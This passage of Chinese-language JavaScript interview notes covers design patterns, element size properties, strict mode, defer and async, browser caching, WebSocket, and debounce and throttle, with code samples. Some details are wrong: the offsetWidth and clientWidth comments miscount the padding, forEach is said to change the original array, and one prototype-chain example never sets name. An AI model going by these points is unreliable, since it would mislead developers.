- 松散耦合程度不同：观察者模式中，主题对象和观察者对象之间是直接关联的，主题对象需要知道每个观察者对象的存在。而在发布订阅模式中，发布者和订阅者之间并不直接关联，它们只与中间件进行通信，发布者和订阅者之间的耦合更加松散。

二者之间的详细解释，参考该文章：[理解【观察者模式】和【发布订阅】的区别](https://juejin.cn/post/6978728619782701087)

**适配器模式（Adapter Pattern）：**

- 优点：允许不兼容接口的对象协同工作，提高代码的复用性和灵活性。
- 缺点：增加了代码的复杂性，需要理解和管理适配器的转换过程。
- 适用场景：当需要将一个类的接口转换成客户端所期望的另一个接口时，可以使用适配器模式。

示例代码：

```javascript
class LegacyLogger {
  log(message) {
    console.log(`Legacy Logger: ${message}`)
  }
}

class NewLogger {
  logMessage(message) {
    console.log(`New Logger: ${message}`)
  }
}

class LoggerAdapter {
  constructor(newLogger) {
    this.newLogger = newLogger
  }
  log(message) {
    this.newLogger.logMessage(message)
  }
}

const legacyLogger = new LegacyLogger()
const newLogger = new NewLogger()

const adapter = new LoggerAdapter(newLogger)

legacyLogger.log('Hello, legacy logger!') // Output: Legacy Logger: Hello, legacy logger!
adapter.log('Hello, new logger!') // Output: New Logger: Hello, new logger!
```

## 13. `offsetWidth`/`offsetHeight`,`clientWidth`/`clientHeight`与`scrollWidth`/`scrollHeight`的区别

- `offsetWidth/offsetHeight`：返回元素的总宽度/高度，包括内容宽度、内边距和边框宽度。该值包含了元素的完整尺寸，包括隐藏的部分和滚动条占用的空间。
- `clientWidth/clientHeight`：返回元素的可视区域宽度/高度，即内容区域加上内边距，但不包括滚动条的宽度。该值表示元素内部可见的部分尺寸。
- `scrollWidth/scrollHeight`：返回元素内容的实际宽度/高度，包括内容区域的尺寸以及溢出内容的尺寸。如果内容没有溢出，则与`clientWidth/clientHeight`的值相同。

**区别总结：**

- `offsetWidth/offsetHeight`包含了元素的边框和滚动条占用的空间，提供了元素的完整尺寸。
- `clientWidth/clientHeight`只包含元素的内容区域和内边距，不包括滚动条，表示了元素内部可见的部分尺寸。
- `scrollWidth/scrollHeight`包含了元素内容的实际宽度/高度，包括溢出内容的尺寸。

示例代码：

```html
<style>
  #box {
    width: 200px;
    height: 200px;
    padding: 20px;
    border: 2px solid black;
    overflow: scroll;
  }
  #content {
    width: 400px;
    height: 400px;
  }
</style>

<div id="box">
  <div id="content"></div>
</div>

<script>
  var box = document.getElementById('box')
  console.log('offsetWidth:', box.offsetWidth) // 224 (200 + 20 + 2 + 2)
  console.log('offsetHeight:', box.offsetHeight) // 224 (200 + 20 + 2 + 2)

  console.log('clientWidth:', box.clientWidth) // 200 (200 + 20 + 20)
  console.log('clientHeight:', box.clientHeight) // 200 (200 + 20 + 20)

  console.log('scrollWidth:', box.scrollWidth) // 400 (content的宽度)
  console.log('scrollHeight:', box.scrollHeight) // 400 (content的高度)
</script>
```

## 14. JS的基本数据类型和引用数据类型

- 基本数据类型：
  - `Undefined`: 表示未定义或未初始化的值。
  - `Null`: 表示空值或不存在的对象。
  - `Boolean`: 表示逻辑上的`true`或`false`。
  - `Number`: 表示数值，包括整数和浮点数。
  - `String`: 表示字符串。
  - `Symbol`: 表示唯一的、不可变的值，通常用作对象的属性键。
- 引用数据类型：
  - `Object`: 表示一个复杂的数据结构，可以包含多个键值对。
  - `Array`: 表示一个有序的、可变长度的集合。
  - `Function`: 表示可执行的代码块，可以被调用执行。

## 15. null，undefined 的区别

`null` 和 `undefined` 是 JavaScript 中表示空值或缺失值的两个特殊值。

**区别如下：**

1. `undefined` 表示变量声明了但没有被赋值，或者访问对象属性不存在时的默认返回值。

   - 当变量被声明但未被赋值时，默认值为 `undefined`。
   - 当访问对象的不存在属性时，返回值为 `undefined`。

2. `null` 表示变量被赋予了一个空值，表示有一个对象，但该对象为空。

   - 当想要明确表示一个变量为空对象时，可以将其赋值为 `null`。
   - `null` 是一个特殊的对象值，表示对象为空，即不指向任何内存地址。

**总结：**

- `undefined` 表示缺少值或未定义的值，常见于变量声明但未赋值的情况。
- `null` 表示空对象，常见于显式地将对象赋值为空。

在使用条件判断时，要注意区分它们的差异。对于严格相等比较，推荐使用 `===` 来避免类型转换，以准确判断两者是否相等。

## 16. javascript 代码中的"use strict";是什么意思

`"use strict"`是一种特定的指令（directive），用于告诉 JavaScript 解析器在解析代码时采用严格模式。它可以出现在 JavaScript 代码的顶部（全局严格模式）或函数体的顶部（函数级严格模式）。

使用严格模式的好处包括：

- 消除了 JavaScript 语法的一些不合理、不严谨之处，减少了一些怪异行为。
- 消除了代码运行的一些不安全之处，保证代码运行的安全。
- 提高编译器效率，增加运行速度，某些优化措施只在严格模式下生效。
- 为未来新版本的 JavaScript 做好铺垫。

严格模式对一些错误和不合理的行为进行了修正，例如：

- 未声明的变量不能被使用。
- 不能对只读属性进行赋值。
- 函数的参数不能有重复的名称。
- 不能删除变量或函数。
- 不能使用八进制字面量（例如 `0123`）。
- 不能使用 `with` 语句。

要注意的是，启用严格模式可能会导致一些代码在非严格模式下不起作用，因为严格模式对语法和行为有更高的要求。因此，在使用严格模式之前，需要仔细测试和检查代码，确保代码在严格模式下正常运行。

```javascript
'use strict'

function myFunction() {
  // 函数级严格模式
  // ...
}

// 全局严格模式
```

## 17. defer和async

> [!NOTE]
>
> - `defer`并行加载`js`文件，会按照页面上`script`标签的顺序执行
> - `async`并行加载`js`文件，下载完成立即执行，不会按照页面上`script`标签的顺序执行

**下面是更详细的解释：**

`defer`和`async`是用于控制`<script>`标签加载和执行的属性。

- **defer** 属性用于延迟脚本的执行，即脚本会被并行下载，该脚本在文档被解析后，在触发 `DOMContentLoaded` 事件之前执行。

  > [!WARNING]
  > 包含 defer 属性的脚本将阻塞 DOMContentLoaded 事件触发，直到脚本完成加载并执行。

  defer 属性对模块脚本也不会生效——它们默认是 defer 的。
  多个带有`defer`属性的脚本会按照它们在文档中的顺序执行。这样可以确保脚本在操作DOM之前加载，避免阻塞页面的渲染。需要注意的是，只有外部脚本（通过`src`属性引入的脚本）才能使用`defer`属性。

  ```html
  <script src="script1.js" defer></script>
  <script src="script2.js" defer></script>
  ```

- **async** 属性用于异步加载脚本，即脚本会被并行下载，并在下载完成后立即执行。多个带有`async`属性的脚本的执行顺序是不确定的，哪个脚本先下载完成就先执行。这样可以提高脚本的加载性能，但可能会导致脚本之间的依赖关系出现问题。同样，只有外部脚本才能使用`async`属性。

  ```html
  <script src="script1.js" async></script>
  <script src="script2.js" async></script>
  ```

需要注意的是，defer和async属性只在外部脚本中生效，即通过src属性引入的脚本。如果脚本直接嵌入在`<script>`标签中，这两个属性不起作用。

选择使用`defer`还是`async`取决于脚本的加载和执行顺序的重要性。如果脚本之间有依赖关系，并且需要按照顺序执行，应使用`defer`。如果脚本之间没有依赖关系，且可以并行加载和执行，可以使用`async`来提高加载性能。

## 18. 说说严格模式的限制

严格模式（Strict Mode）是 ECMAScript 5 引入的一种特殊模式，用于限制 JavaScript 代码中的一些不安全或不规范的语法，提供更严格的语法检查，减少一些怪异行为，并改善代码质量和可维护性。

**严格模式的一些限制包括但不限于：**

1. 变量必须先声明再使用，禁止隐式全局变量。
2. 函数的参数不能有同名属性，否则会报错。
3. 禁止使用 `with` 语句。
4. 不能对只读属性赋值，否则会报错。
5. 不能使用前缀 `0` 表示八进制数，否则会报错。
6. 不能删除不可删除的属性，不能删除变量，只能删除对象属性。
7. `eval` 函数在其内部引入的变量不会影响外部作用域。
8. `eval` 和 `arguments` 不能被重新赋值。
9. `arguments` 不会自动反映函数参数的变化。
10. 不能使用 `arguments.callee` 和 `arguments.caller`。
11. 禁止 `this` 指向全局对象。
12. 不能使用 `fn.caller` 和 `fn.arguments` 获取函数调用的堆栈。
13. 增加了一些保留字，如 `protected`、`static` 和 `interface`。

使用严格模式可以提高代码的可靠性，减少意外错误和怪异行为。要启用严格模式，可以在脚本文件或函数体的开头加上 `'use strict'`; 来指示 JavaScript 解析器以严格模式解析代码。

## 19. attribute和property的区别是什么

> - `attribute`是`dom`元素在文档中作为`html`标签拥有的属性；
> - `property`就是`dom`元素在`js`中作为对象拥有的属性。
> - 对于`html`的标准属性来说，`attribute`和`property`是同步的，是会自动更新的
> - 但是对于自定义的属性来说，他们是不同步的

`attribute`和`property`是用于描述DOM元素的特性和属性的两个概念。

**区别如下：**

- `Attribute`（属性）是DOM元素在HTML文档中定义的特性，它可以在HTML标签上声明并存储相关信息。例如，`<div class="container">`中的`class`就是一个属性。在JavaScript中，可以通过`getAttribute`和`setAttribute`方法来获取和设置属性的值。
- `Property`（属性）是DOM元素作为对象的属性，用于访问和操作元素的状态和行为。例如，`document.getElementById('myElement').className`中的`className`就是DOM对象的属性。在JavaScript中，可以直接通过`.`运算符来访问和修改对象的属性。

**主要区别：**

1. 同步性：对于HTML标准属性来说，属性和特性是同步的，它们会相互影响和更新。但是对于自定义的属性，特性和属性之间是不同步的。
2. 值的类型：属性值是具体的数据类型，例如字符串、布尔值、数字等。而特性值始终是字符串。
3. 访问方式：属性可以通过直接访问对象的属性来获取和设置，而特性需要使用相关的方法（例如`getAttribute`和`setAttribute`）来访问和操作。

需要注意的是，大多数情况下，我们更常使用属性来操作DOM元素，因为它们更直观和方便。而特性主要用于处理自定义属性或一些特殊情况下的操作

## 20. 如何通过JS判断一个数组

1. `instanceof`方法：使用`instanceof`运算符判断对象是否为数组，返回布尔值。例如：`arr instanceof Array`。
2. `constructor`方法：使用`constructor`属性返回对象的构造函数，并判断该构造函数是否为数组构造函数。例如：`arr.constructor == Array`。
3. 使用`Object.prototype.toString.call()`方法：利用`Object.prototype.toString.call(value)`方法，将要判断的变量作为参数传入，并判断返回的字符串是否为`"[object Array]"`。例如：`Object.prototype.toString.call(arr) == '[object Array]'`。
4. `ES5`新增的`isArray()`方法：使用`Array.isArray()`方法判断一个值是否为数组，返回布尔值。例如：`Array.isArray(arr)`。

## 21. map与forEach的区别

- `map`方法：`map()`方法创建一个新数组，其结果是该数组中的每个元素都调用一个提供的函数后返回的结果。`map()`方法不会改变原始数组，而是返回一个新数组。

  ```javascript
  const numbers = [1, 2, 3, 4, 5]
  const doubled = numbers.map((num) => num * 2)
  console.log(doubled) // Output: [2, 4, 6, 8, 10]
  ```

- `forEach`方法：`forEach()`方法对数组的每个元素执行一次提供的函数，没有返回值。`forEach()`方法会改变原始数组，但不会返回新数组。

  ```javascript
  const numbers = [1, 2, 3, 4, 5]
  numbers.forEach((num) => console.log(num * 2))
  // Output:
  // 2
  // 4
  // 6
  // 8
  ```

**区别总结：**

- `map`方法会返回一个新数组，其结果是对原数组中的每个元素调用一个函数后的返回值。
- `forEach`方法不会返回新数组，而是对原数组中的每个元素执行一个函数。

## 22. 谈一谈箭头函数与普通函数的区别？

箭头函数（Arrow Function）是 ES6 新增的一种函数定义方式，箭头函数是为了解决函数的**二义性**问题，简化函数的定义。与普通函数相比，箭头函数具有以下特点：

1. **`this`指向：** 箭头函数没有自己的`this`，它会捕获所在上下文的`this`值。而普通函数的`this`是在运行时确定的，根据调用方式决定。
2. **`arguments`对象：** 箭头函数没有自己的`arguments`对象，可以使用`rest`参数代替。普通函数有自己的`arguments`对象。
3. **`new`调用：** 箭头函数不能被用作构造函数，不能使用`new`关键字调用。普通函数可以使用`new`关键字调用，返回一个新的对象。
4. **`prototype`属性：** 箭头函数没有`prototype`属性。普通函数有`prototype`属性。
5. **`yield`关键字：** 箭头函数不能使用`yield`关键字，因此不能用作`Generator`函数。普通函数可以使用`yield`关键字，用作`Generator`函数。

**总结：**

- 箭头函数没有自己的`this`，`arguments`对象，`prototype`属性，不能被用作构造函数，不能使用`yield`关键字。
- 箭头函数更适合作为回调函数或简单的函数表达式，而普通函数适合作为构造函数或需要`this`上下文的函数。

## 23. 谈谈你对原生Javascript了解程度

> [!IMPORTANT]
> 数据类型、运算、对象、`Function`、继承、闭包、作用域、原型链、事件、`RegExp`、`JSON`、`Ajax`、`DOM`、`BOM`、内存泄漏、跨域、异步装载、模板引擎、前端MVC、路由、模块化、`Canvas`、`ECMAScript`

**1. 数据类型：JavaScript具有多种数据类型，包括字符串、数字、布尔值、对象、数组、函数等 2. 运算：JavaScript支持常见的算术运算、逻辑运算和比较运算，也支持位运算和三元运算符：**

```js
let sum = 5 + 3
let isTrue = true && false
let isEqual = 10 === 5
let bitwiseOr = 3 | 5
let result = num > 0 ? 'Positive' : 'Negative'
```

**3. 对象：JavaScript中的对象是键值对的集合，可以通过字面量形式或构造函数创建对象：**

```js
let person = { name: 'poetry', age: 25 }
let car = new Object()
car.brand = 'Toyota'
car.color = 'Blue'
```

**4. Function：JavaScript中的函数是一等公民，可以作为变量、参数或返回值进行操作：**

```js
function add(a, b) {
  return a + b
}

let multiply = function (a, b) {
  return a * b
}

let result = multiply(2, 3)
```

**5. 继承： JavaScript使用原型链实现对象之间的继承关系：**

```js
function Animal(name) {
  this.name = name
}

Animal.prototype.sayHello = function () {
  console.log("Hello, I'm " + this.name)
}

function Dog(name, breed) {
  Animal.call(this, name)
  this.breed = breed
}

Dog.prototype = Object.create(Animal.prototype)
Dog.prototype.constructor = Dog

let dog = new Dog('Max', 'Labrador')
dog.sayHello()
```

**6. 闭包：闭包是指函数能够访问其词法作用域外的变量，通过闭包可以实现数据的私有化和封装：**

```js
function outerFunction() {
  let count = 0

  return function () {
    count++
    console.log(count)
  }
}

let increment = outerFunction()
increment() // 输出：1
increment() // 输出：2
```

**7. 作用域：JavaScript具有函数作用域和块级作用域，在不同的作用域中变量的可访问性不同：**

```js
function example() {
  let x = 10

  if (true) {
    let y = 20
    console.log(x) // 输出：10
    console.log(y) // 输出：20
  }
}
```

**8. 原型链：原型链是JavaScript中实现对象继承的机制，每个对象都有一个原型对象，形成一个链式结构：**

```javascript
function Animal(name) {
  this.name = name
}

Animal.prototype.sayHello = function () {
  console.log("Hello, I'm " + this.name)
}

function Dog(name, breed) {
  this.breed = breed
}

Dog.prototype = Object.create(Animal.prototype)
Dog.prototype.constructor = Dog

let dog = new Dog('Max', 'Labrador')
dog.sayHello()
```

**9. 事件：JavaScript通过事件来响应用户的操作，可以通过事件监听和事件处理函数来实现：**

```js
let button = document.getElementById('myButton')

button.addEventListener('click', function () {
  console.log('Button clicked')
})
```

**10. RegExp：正则表达式是一种用于匹配和操作字符串的强大工具，JavaScript中提供了内置的RegExp对象：**

```js
let pattern = /[a-zA-Z]+/
let text = 'Hello, World!'
let result = pattern.test(text)
console.log(result) // 输出：true
```

**11. JSON：JSON是一种用于数据交换的格式，JavaScript提供了JSON对象来进行解析和生成JSON数据：**

```js
let jsonStr = '{"name":"poetry", "age":25}'
let obj = JSON.parse(jsonStr)
console.log(obj.name) // 输出：poetry

let obj2 = { name: 'Jane', age: 30 }
let jsonStr2 = JSON.stringify(obj2)
console.log(jsonStr2) // 输出：{"name":"Jane","age":30}
```

**12. Ajax：Ajax是一种在后台与服务器进行异步通信的技术，可以实现页面的局部刷新和动态数据加载：**

```js
let xhr = new XMLHttpRequest()
xhr.open('GET', 'https://api.example.com/data', true)
xhr.onreadystatechange = function () {
  if (xhr.readyState === 4 && xhr.status === 200) {
    let response = xhr.responseText
    console.log(response)
  }
}
xhr.send()
```

**13. DOM：DOM是JavaScript操作网页内容和结构的接口，可以通过DOM来增删改查网页元素：**

```js
let element = document.getElementById('myElement')
element.innerHTML = 'New content'

let newElement = document.createElement('div')
newElement.textContent = 'Dynamic element'
document.body.appendChild(newElement)
```

**14. BOM：BOM（浏览器对象模型）提供了与浏览器窗口交互的接口，如操作浏览器历史记录、定时器等：**

```js
window.location.href = 'https://www.example.com'
let screenWidth = window.screen.width
let timer = setTimeout(function () {
  console.log('Timer expired')
}, 5000)
```

**15. 内存泄漏：内存泄漏是指无用的内存占用没有被释放，JavaScript中需要注意避免造成内存泄漏：**

```javascript
function createHeavyObject() {
  let bigArray = new Array(1000000).fill('data')
  return bigArray
}

let data = createHeavyObject()

// 释放无用的引用，帮助垃圾回收器回收内存
data = null
```

**16. 跨域：跨域是指在浏览器中访问不同源的资源，需要遵守同源策略或通过CORS等方式解决：**

```javascript
// 跨域请求示例
let xhr = new XMLHttpRequest()
xhr.open('GET', 'https://api.example.com/data', true)
xhr.withCredentials = true
xhr.onreadystatechange = function () {
  if (xhr.readyState === 4 && xhr.status === 200) {
    let response = xhr.responseText
    console.log(response)
  }
}
xhr.send()
```

**17. 异步装载：通过异步加载资源，如图片、样式表和脚本，可以提高页面加载和性能：**

```javascript
// 异步加载脚本
let script = document.createElement('script')
script.src = 'https://example.com/script.js'
document.head.appendChild(script)

// 异步加载图片
let image = new Image()
image.src = 'https://example.com/image.jpg'
image.onload = function () {
  console.log('Image loaded')
}
```

**18. 模板引擎：模板引擎是用于生成动态HTML内容的工具，可以将数据和模板进行结合生成最终的HTML：**

```javascript
let data = { name: 'van', age: 26 }

let template = `
  <h1>My Profile</h1>
  <p>Name: ${data.name}</p>
  <p>Age: ${data.age}</p>
`

document.getElementById('profileContainer').innerHTML = template
```

**19. 前端MVC：前端MVC（Model-View-Controller）是一种将应用程序分为数据模型、视图和控制器的架构模式：**

```javascript
// 模型（Model）
let user = {
  name: 'van',
  age: 26,
}

// 视图（View）
function renderUser(user) {
  let container = document.getElementById('userContainer')
  container.innerHTML = `
    <p>Name: ${user.name}</p>
    <p>Age: ${user.age}</p>
  `
}

// 控制器（Controller）
function updateUserAge(newAge) {
  user.age = newAge
  renderUser(user)
}

updateUserAge(30)
```

**20. 路由：路由是指根据不同的URL路径切换不同的页面或视图，前端路由可以通过URL的变化来加载对应的组件或页面：**

```js
// 设置路由规则
const routes = [
  { path: '/', component: Home },
  { path: '/about', component: About },
  { path: '/contact', component: Contact },
]

// 监听URL变化
window.addEventListener('hashchange', () => {
  const path = window.location.hash.substring(1)
  const route = routes.find((route) => route.path === path)

  if (route) {
    const component = new route.component()
    component.render()
  }
})

// 渲染组件
class Home {
  render() {
    document.getElementById('app').innerHTML = '<h1>Home Page</h1>'
  }
}

class About {
  render() {
    document.getElementById('app').innerHTML = '<h1>About Page</h1>'
  }
}

class Contact {
  render() {
    document.getElementById('app').innerHTML = '<h1>Contact Page</h1>'
  }
}

// 初始加载默认路由
window.location.hash = '/'
```

**21. 模块化：JavaScript模块化通过将代码分割为独立的模块，每个模块具有自己的作用域和接口：**

```js
// 模块B
import { add, multiply } from './moduleA.js'

// 模块A
export function add(a, b) {
  return a + b
}

export function multiply(a, b) {
  return a * b
}

let sum = add(2, 3)
let product = multiply(4, 5)
```

**22.Canvas：Canvas是HTML5提供的用于绘制图形和动画的API，可以通过JavaScript操作Canvas元素：**

```js
let canvas = document.getElementById('myCanvas')
let ctx = canvas.getContext('2d')

ctx.fillStyle = 'red'
ctx.fillRect(0, 0, canvas.width, canvas.height)

ctx.strokeStyle = 'blue'
ctx.lineWidth = 2
ctx.beginPath()
ctx.arc(100, 100, 50, 0, 2 * Math.PI)
ctx.stroke()
```

**23. ECMAScript：ECMAScript是JavaScript的标准化规范，定义了语法、数据类型、函数等核心特性：**

```js
// ECMAScript 6示例
let name = 'van'
let age = 26

let message = `My name is ${name} and I'm ${age} years old.`

console.log(message)
```

> 这些是原生JavaScript的一些重要特性和示例代码，涵盖了数据类型、运算、对象、函数、继承、闭包、作用域、原型链、事件、正则表达式、JSON、Ajax、DOM、BOM、内存泄漏、跨域、异步装载、模板引擎、前端MVC、路由、模块化、Canvas和ECMAScript。当然，JavaScript还有许多其他特性和用法，这只是其中一部分。

## 24. 聊聊浏览器缓存

> 浏览器缓存分为强缓存和协商缓存。当客户端请求某个资源时，获取缓存的流程如下

- 先根据这个资源的一些 `http header` 判断它是否命中强缓存，如果命中，则直接从本地获取缓存资源，不会发请求到服务器；
- 当强缓存没有命中时，客户端会发送请求到服务器，服务器通过另一些`request header`验证这个资源是否命中协商缓存，称为`http`再验证，如果命中，服务器将请求返回，但不返回资源，而是告诉客户端直接从缓存中获取，客户端收到返回后就会从缓存中获取资源；
- 强缓存和协商缓存共同之处在于，如果命中缓存，服务器都不会返回资源； 区别是，强缓存不对发送请求到服务器，但协商缓存会。
- 当协商缓存也没命中时，服务器就会将资源发送回客户端。
- 当 `ctrl+f5` 强制刷新网页时，直接从服务器加载，跳过强缓存和协商缓存；
- 当 `f5`刷新网页时，跳过强缓存，但是会检查协商缓存；

**强缓存：**

- `Expires`（该字段是 `http1.0` 时的规范，值为一个绝对时间的 `GMT` 格式的时间字符串，代表缓存资源的过期时间）
- `Cache-Control:max-age`（该字段是 `http1.1`的规范，强缓存利用其 `max-age` 值来判断缓存资源的最大生命周期，它的值单位为秒）

```js
const http = require('http')
const fs = require('fs')
const path = require('path')

http
  .createServer((req, res) => {
    const filePath = path.join(__dirname, 'public', req.url)

    fs.readFile(filePath, (err, data) => {
      if (err) {
        res.writeHead(404)
        res.end('File not found')
        return
      }

      const stat = fs.statSync(filePath)
      const expires = new Date(Date.now() + 3600000) // 设置缓存过期时间为1小时

      res.setHeader('Expires', expires.toUTCString())
      res.setHeader('Cache-Control', 'max-age=3600')

      res.writeHead(200)
      res.end(data)
    })
  })
  .listen(3000, () => {
    console.log('Server is running on port 3000')
  })
```

**协商缓存：**

- `Last-Modified`（值为资源最后更新时间，随服务器response返回）
- `If-Modified-Since`（通过比较两个时间来判断资源在两次请求期间是否有过修改，如果没有修改，则命中协商缓存）
- `ETag`（表示资源内容的唯一标识，随服务器`response`返回）
- `If-None-Match`（服务器通过比较请求头部的`If-None-Match`与当前资源的`ETag`是否一致来判断资源是否在两次请求之间有过修改，如果没有修改，则命中协商缓存）

```js
const http = require('http')
const fs = require('fs')
const path = require('path')
const crypto = require('crypto')

http
  .createServer((req, res) => {
    const filePath = path.join(__dirname, 'public', req.url)

    fs.readFile(filePath, (err, data) => {
      if (err) {
        res.writeHead(404)
        res.end('File not found')
        return
      }

      const stat = fs.statSync(filePath)
      const lastModified = stat.mtime.toUTCString()
      const ifModifiedSince = req.headers['if-modified-since']

      const fileHash = crypto.createHash('md5').update(data).digest('hex')
      const etag = `"${fileHash}"`
      const ifNoneMatch = req.headers['if-none-match']

      if (ifModifiedSince && lastModified === ifModifiedSince) {
        res.writeHead(304) // 文件未修改，返回 304 Not Modified
        res.end()
      } else if (ifNoneMatch && etag === ifNoneMatch) {
        res.writeHead(304) // 文件未修改，返回 304 Not Modified
        res.end()
      } else {
        res.setHeader('Last-Modified', lastModified)
        res.setHeader('ETag', etag)

        res.writeHead(200)
        res.end(data)
      }
    })
  })
  .listen(3000, () => {
    console.log('Server is running on port 3000')
  })
```

在上述示例中，使用了 `crypto` 模块计算文件的 `MD5` 哈希值作为 `ETag`。在每个请求中，首先检查 `If-Modified-Since` 请求头和文件的最后修改时间，如果相同则返回 `304 Not Modified`。然后，检查 `If-None-Match` 请求头和文件的 `ETag`，如果相同则返回 `304 Not Modified`。如果都不匹配，则设置 `Last-Modified` 和 `ETag` 响应头，并返回文件内容。

这样，通过使用 `Last-Modified` 和 `If-Modified-Since` 以及 `ETag` 和 `If-None-Match`，可以实现基于协商的缓存机制，减少不必要的数据传输和服务器负载。

详细内容可参考：[浏览器缓存机制](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Caching)

## 25. 聊聊你对Websocket的理解

> 由于 `http` 存在一个明显的弊端（消息只能有客户端推送到服务器端，而服务器端不能主动推送到客户端），导致如果服务器如果有连续的变化，这时只能使用轮询，而轮询效率过低，并不适合。于是 `WebSocket`被发明出来

WebSocket 是一种在 Web 应用程序中实现双向通信的协议。与传统的 HTTP 请求-响应模式不同，WebSocket 提供了持久连接，使服务器能够主动向客户端推送数据，而不需要客户端发起请求。以下是我对 WebSocket 的理解：

1. **双向通信**：WebSocket 允许客户端和服务器之间建立持久连接，并通过这个连接进行双向通信。客户端和服务器可以随时发送消息给对方，实现实时的数据传输。
2. **实时性**：相比传统的 HTTP 请求-响应模式，WebSocket 具有更低的延迟和更高的实时性。服务器可以立即将数据推送给客户端，而不需要等待客户端的请求。
3. **协议标识符**：WebSocket 使用 `ws://`（非加密）或 `wss://`（加密）作为协议标识符，用于建立与服务器的连接。
4. **较少的控制开销**：WebSocket 的协议控制数据包头部较小，不需要携带完整的头部信息，减少了数据传输的开销。
5. **支持文本和二进制数据**：WebSocket 不仅可以传输文本数据，还可以传输二进制数据，使得它适用于各种类型的应用场景。
6. **支持扩展**：WebSocket 协议定义了扩展机制，允许用户自定义扩展或实现自定义的子协议，例如压缩算法、认证机制等。
7. **无跨域问题**：WebSocket 协议不存在跨域限制，可以轻松地在不同域名下进行通信。
8. **简单实现**：实现 WebSocket 相对简单，服务器端和客户端都有相应的库或 API 可以使用，例如 Node.js 中的 socket.io、ws 等，客户端则可以使用浏览器提供的 WebSocket API。

总的来说，WebSocket 提供了一种高效、实时的双向通信机制，使得 Web 应用程序可以实现实时更新、即时通信等功能。它具有较低的延迟、支持文本和二进制数据传输、无跨域限制等优势，可以广泛应用于在线聊天、实时数据展示、多人协同编辑等领域。

**1. WebSocket 示例代码：**

以下是一个简单的使用 WebSocket 的示例代码，包括客户端和服务器端的实现：

**客户端代码（JavaScript）：**

```javascript
// 创建 WebSocket 连接
const socket = new WebSocket('ws://localhost:3000')

// 监听连接建立事件
socket.addEventListener('open', () => {
  console.log('Connected to server')
  // 发送消息给服务器
  socket.send('Hello server!')
})

// 监听接收到消息事件
socket.addEventListener('message', (event) => {
  const message = event.data
  console.log('Received message:', message)
})

// 监听连接关闭事件
socket.addEventListener('close', () => {
  console.log('Disconnected from server')
})
```

**服务器端代码（Node.js）：**

```javascript
const WebSocket = require('ws')

// 创建 WebSocket 服务器
const wss = new WebSocket.Server({ port: 3000 })

// 监听连接建立事件
wss.on('connection', (socket) => {
  console.log('Client connected')

  // 监听接收到消息事件
  socket.on('message', (message) => {
    console.log('Received message:', message)

    // 发送消息给客户端
    socket.send('Hello client!')
  })

  // 监听连接关闭事件
  socket.on('close', () => {
    console.log('Client disconnected')
  })
})
```

> 上述示例中，客户端通过 `new WebSocket(url)` 创建一个 WebSocket 连接，监听连接建立、接收到消息和连接关闭等事件，并通过 `send()` 方法发送消息给服务器。服务器端使用 `ws` 模块创建 WebSocket 服务器，监听连接建立、接收到消息和连接关闭等事件，并通过 `send()` 方法发送消息给客户端。

**2. socket.io 示例代码：**

以下是一个使用 socket.io 的示例代码，包括客户端和服务器端的实现：

**客户端代码（JavaScript）：**

```javascript
// 引入 socket.io 客户端库
import io from 'socket.io-client'

// 连接到服务器
const socket = io('http://localhost:3000')

// 监听连接建立事件
socket.on('connect', () => {
  console.log('Connected to server')

  // 发送消息给服务器
  socket.emit('message', 'Hello server!')
})

// 监听接收到消息事件
socket.on('message', (message) => {
  console.log('Received message:', message)
})

// 监听连接关闭事件
socket.on('disconnect', () => {
  console.log('Disconnected from server')
})
```

**服务器端代码（Node.js）：**

```javascript
const express = require('express')
const app = express()
const http = require('http').createServer(app)
const io = require('socket.io')(http)

// 监听连接建立事件
io.on('connection', (socket) => {
  console.log('Client connected')

  // 监听接收到消息事件
  socket.on('message', (message) => {
    console.log('Received message:', message)

    // 发送消息给客户端
    socket.emit('message', 'Hello client!')
  })

  // 监听连接关闭事件
  socket.on('disconnect', () => {
    console.log('Client disconnected')
  })
})

// 启动 HTTP 服务器
http.listen(3000, () => {
  console.log('Server 已经在本地的 3000 端口启动')
})
```

> 上述示例中，客户端通过 `import io from 'socket.io-client'` 引入 socket.io 客户端库，连接到服务器并监听连接建立、接收到消息和连接关闭等事件。服务器端使用 Express 创建一个 HTTP 服务器，通过 `socket.io` 模块创建 socket.io 实例，并监听连接建立、接收到消息和连接关闭等事件，并通过 `emit()` 方法发送消息给客户端。

## 26. 聊聊你对事件循环的理解

## 27. 防抖/节流

**1. 防抖：**

> 防抖函数原理：**把触发非常频繁的事件合并成一次去执行** 在指定时间内只执行一次回调函数，如果在指定的时间内又触发了该事件，则回调函数的执行时间会基于此刻重新开始计算

![防抖](/images/debounce.png)

防抖动和节流本质是不一样的。**防抖动是将多次执行变为`最后一次执行`，节流是将多次执行变成`每隔一段时间执行`**

**简化版防抖函数：**

```js
// func是用户传入需要防抖的函数
// wait是等待时间
const debounce = (func, wait = 50) => {
  // 缓存一个定时器id
  let timer = 0
  // 这里返回的函数是每次用户实际调用的防抖函数
  // 如果已经设定过定时器了就清空上一次的定时器
  // 开始一个新的定时器，延迟执行用户传入的方法
  return function (...args) {
    if (timer) clearTimeout(timer)
    timer = setTimeout(() => {
      func.apply(this, args)
    }, wait)
  }
}
```

**适用场景：**

- 文本输入的验证，连续输入文字后发送 AJAX 请求进行验证，验证一次就好
- 按钮提交场景：防止多次提交按钮，只执行最后提交的一次
- 服务端验证场景：表单验证需要服务端配合，只执行一段连续的输入事件的最后一次，还有搜索联想词功能类似

**2. 节流：**

> 节流函数原理:指频繁触发事件时，只会在指定的时间段内执行事件回调，即触发事件间隔大于等于指定的时间才会执行回调函数。总结起来就是：**事件，按照一段时间的间隔来进行触发**。

![节流](/images/throttle.png)

> 像dom的拖拽，如果用防抖的话，就会出现卡顿的感觉，因为只在拖拽动作停止后执行了一次，这个时候就应该用节流，在一定时间内多次执行，会流畅很多

**简化版节流函数：**

使用时间戳的节流函数会在第一次触发事件时立即执行，以后每过 `wait` 秒之后才执行一次，并且最后一次触发事件不会被执行

**时间戳方式：**

```js
// func是用户传入需要防抖的函数
// wait是等待时间
const throttle = (func, wait = 50) => {
  // 上一次执行该函数的时间
  let lastTime = 0
  return function (...args) {
    // 当前时间
    let now = +new Date()
    // 将当前时间和上一次执行函数时间对比
    // 如果差值大于设置的等待时间就执行函数
    if (now - lastTime > wait) {
      lastTime = now
      func.apply(this, args)
    }
  }
}

setInterval(
  throttle(() => {
    console.log(1)
  }, 500),
  1,
)
```

**定时器方式：**

